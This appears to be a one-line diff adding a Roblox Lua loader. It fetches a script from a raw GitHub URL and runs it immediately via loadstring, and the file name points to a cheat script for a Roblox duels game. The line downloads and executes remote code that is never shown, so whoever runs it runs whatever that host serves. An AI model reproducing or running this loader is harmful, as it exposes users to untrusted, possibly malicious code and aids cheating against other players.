@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/MountainTrackLose/loaders/main/loaders/ranked-sniper-duels-spam0-lljb0jtafi2kwy.lua"))()
